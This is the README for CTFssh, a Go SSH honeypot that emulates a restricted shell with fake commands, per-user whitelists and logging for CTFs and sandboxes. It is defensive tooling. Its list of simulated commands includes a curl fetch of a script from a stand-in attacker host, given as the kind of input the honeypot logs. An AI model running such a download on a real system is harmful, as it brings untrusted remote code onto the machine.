# CTFssh – Minimal SSH Honeypot Shell

**CTFssh** is a lightweight and configurable SSH server written in Go, designed to simulate a restricted shell for honeypots, CTFs, and sandbox environments. It supports both password and public key authentication, user-based command whitelists, and realistic command emulation.

---

## ✨ Features

- 🔐 Auth via shadow-compatible password hashes or SSH public keys
- 🧑 Per-user permissions and command restrictions
- 📂 Simulates Linux commands using static text or fake executable scripts
- 🚫 No shell, tunneling, SCP, or real exec
- 🪓 Login rate limiting per user/IP
- 🧠 Honeypot-safe logging of commands and URLs

---

## 🛠️ How It Works

- Users are authenticated using `users.json`
- Each session launches a custom shell environment
- Only predefined commands are accepted per user
- Commands either:
  - Return static text (from `text/`)
  - Run safe scripts (from `command/`)
- Logs all commands, login attempts, and fake network usage

---

## 📁 Project Layout

. ├── main.go # Entrypoint ├── users.go # Authentication logic ├── commands.go # Command dispatch and execution ├── hostkey.go # Host key loader/generator ├── ratelimit.go # Login rate-limiting ├── users.json # User definitions ├── host_key # SSH server key ├── command/ # Simulated executables (curl, ping, etc.) ├── text/ # Static command output (ls, uname, etc.) ├── help/ # Help messages per command ├── work/ # Optional user work directory

---

## 🚀 Quick Start

### 🔧 Build

```bash
go build -o ctfssh
🔐 Host Key
Generate it on first run or with:
make hostkey
👤 Create users.json
Example:
[
  {
    "username": "admin",
    "hash": "$6$somesalt$...",
    "admin": true,
    "restrict": "",
    "allowed": ["help", "exit", "ls", "cat", "curl", "wget"],
    "prompt": "$ ",
    "banner": "Welcome to your secure fake shell"
  }
]
Generate hashes:
python3 -c 'import crypt; print(crypt.crypt("admin", crypt.mksalt(crypt.METHOD_SHA512)))'
▶️ Run the Server
./ctfssh --port 2222 --hostkey host_key --users users.json --banner "SSH-2.0-CTFssh"
🧪 Simulated Commands

cat /proc/cpuinfo
curl https://attacker.com/file.sh
ping 8.8.8.8
w, last, uname, uptime, ls, id
🔒 Security & Safety

All commands are isolated and non-destructive
Inputs are parsed and sanitized
No shell or command chaining allowed
Rate limiting blocks bruteforce attempts
Can safely be run on port 22 using:
authbind
setcap
iptables redirect
🧠 Good To Know


Flag	Description
--port	Port to listen on
--hostkey	Path to SSH private key
--users	Path to user config JSON
--banner	SSH version banner string
📦 Example Commands in command/

cat → fake /proc and /etc reads
curl, wget → logs URLs and mimics download
ping → fake ICMP responses
w, last → fake session reports
📤 Deployment

Use make build or:
go build -o ctfssh main.go users.go commands.go hostkey.go ratelimit.go
Use authbind, iptables, or setcap to bind to port 22 as non-root.
🛡️ License

MIT
💬 Contributing

Pull requests welcome — especially for new fake command modules or integrations.
🖼️ Screenshot

$ ssh admin@localhost -p 2222
Welcome to your secure fake shell
Type 'help' to see available commands.

$ help
Available commands:
  - ls
  - cat
  - curl
  - wget
  - exit

---

